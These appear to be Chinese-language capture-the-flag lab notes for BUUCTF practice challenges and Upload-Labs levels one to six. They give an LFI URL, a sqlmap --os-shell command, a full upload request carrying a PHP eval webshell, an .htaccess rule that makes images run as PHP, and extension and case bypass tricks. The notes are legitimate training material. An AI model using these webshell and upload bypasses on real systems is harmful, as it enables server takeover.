# BUU LFI COURSE 1
`view-source:http://5fe44853-857f-4e8d-b756-56ea72f00a21.node5.buuoj.cn:81/?file=/flag`

# BUU BRUTE 1
使用 burp 对 password 从 0000-9999 暴力破解

# BUU SQL COURSE 1
使用 sqlmap
```sh
python .\tools\sqlmap\sqlmap.py -u "http://a6acd68a-3f7b-4ea6-aa60-a4e3b6b7ac0d.node5.buuoj.cn:81/backend/content_detail.php?id=2" --os-shell
ls
find / -name flag
cat /flag
```

# Upload-Labs-Linux
关于文件上传

### pass1 客户端 js 验证
禁用网页js（使用插件Quick Javascript Switcher）,或者使用burpsuit。上传 webshell
```
------WebKitFormBoundarykQoJzWfXWa1VBSZj
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: image/png

<?php
eval($_POST["pass"]);

------WebKitFormBoundarykQoJzWfXWa1VBSZj
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundarykQoJzWfXWa1VBSZj--
```
然后使用菜刀、蚁剑、Godzilla打开上传文件的地址`xxxx/upload/shell.php`

### pass2 服务器文件类型验证
上传文件时，明确 `Content-Type: image/png`， 方法同上

### pass3 服务器文件后缀验证
上传文件时，文件后缀可以尝试 `.php .phtml .phps .php5 .pht`，方法同上

### pass4 服务器 `Apache .htaccess` 配置文件验证
方案1：
添加无法解析的后缀如 `pass4.php.xxxx` 绕过验证。一句话木马可以尝试使用 `<?php echo(phpinfo());?>` 来验证。
上传成功后访问 `http://xxxxx/upload/pass4.php.xxxx` 来验证。
方案2：
利用.htaccess来把含有php语言的图片，能够作为脚本处理。以下是 .htaccess 文件内容
```
<FilesMatch "pass4.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```
上传后尝试打开：`http://xxxxx/upload/.htaccess` 如果返回403，证明已经上传成功。
然后将一句话木马用 `.jpg` 文件后缀进行上传，然后网站就会将 .jpg 作为 php 来解析了。
`http://xxxxx/upload/pass4.jpg`

### pass5 大小写绕过
使用 `PHp` 后缀上传 webshell

### pass6 空格绕过
使用 `php ` 后缀上传 webshell



